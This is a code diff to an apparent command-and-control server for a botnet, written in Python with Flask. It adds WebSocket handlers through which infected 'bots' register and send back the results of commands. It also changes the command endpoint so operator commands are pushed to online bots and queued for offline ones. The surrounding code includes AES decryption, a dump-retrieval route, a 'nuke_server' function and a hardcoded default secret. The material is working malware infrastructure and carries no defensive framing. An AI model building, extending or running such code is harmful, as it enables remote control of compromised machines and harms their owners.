@@ -8,12 +8,50 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 import base64
 import hashlib
+from flask_socketio import SocketIO, emit
+import eventlet
+eventlet.monkey_patch()
+
+socketio = SocketIO(app, cors_allowed_origins="*")
+active_sockets = {}
+
 
 command_queue = {}
 command_results = {}
 
 SECRET_KEY = os.getenv('SECRET_KEY', 'FromThe104WeSurveyTheOtherSideOfTheSea')
 AES_SECRET = os.getenv("AES_SECRET", "FromThe104")
+
+
+@socketio.on('connect')
+def handle_connect():
+    print("Client connected (no ID yet)")
+
+@socketio.on('register')
+def register_bot(data):
+    bot_id = data.get("bot_id")
+    if bot_id:
+        active_sockets[bot_id] = request.sid
+        print(f"Bot {bot_id} registered via WebSocket")
+
+@socketio.on('response')
+def handle_response(data):
+    bot_id = data.get("bot_id")
+    output = data.get("output")
+    if bot_id and output:
+        command_results[bot_id] = output
+        print(f"[{bot_id}] response: {output}")
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    sid = request.sid
+    for bot, socket_id in list(active_sockets.items()):
+        if socket_id == sid:
+            del active_sockets[bot]
+            print(f"Bot {bot} disconnected")
+
+
+
 
 def get_aes_key():
     return hashlib.sha256(AES_SECRET.encode()).digest()
@@ -79,15 +117,21 @@ def get_dump(filename):
 
 @app.route('/command/<agent_id>', methods=['POST'])
 @require_token
-def set_command(agent_id):
+def send_command(agent_id):
     data = request.get_json()
-    cmd = data.get("cmd")
+    command = data.get("cmd")
 
-    if not cmd:
-        return jsonify({"error": "Missing 'cmd'"}), 400
+    if not command:
+        return jsonify({"error": "No command provided"}), 400
 
-    command_queue[agent_id] = cmd
-    return jsonify({"status": "command set", "cmd": cmd})
+    command_queue[agent_id] = command
+
+    # Push to WebSocket if online
+    if agent_id in active_sockets:
+        socketio.emit("command", {"cmd": command}, room=active_sockets[agent_id])
+        return jsonify({"status": f"command '{command}' sent to {agent_id} via WebSocket"})
+
+    return jsonify({"status": f"command '{command}' queued for {agent_id} (offline)"})
 
 @app.route('/get/<agent_id>', methods=['GET'])
 def get_command(agent_id):
@@ -134,4 +178,4 @@ def nuke_server():
 
 
 if __name__ == '__main__':
-    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    socketio.run(app, host='0.0.0.0', port=5000)
